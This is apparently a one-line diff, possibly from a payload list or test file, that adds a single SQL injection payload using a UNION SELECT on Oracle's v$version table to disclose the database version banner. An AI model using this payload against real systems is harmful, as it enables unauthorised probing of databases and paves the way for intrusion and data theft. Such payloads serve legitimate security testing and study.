@@ -1,0 +1,1 @@
+' union select BANNER,NULL from v$version-- -
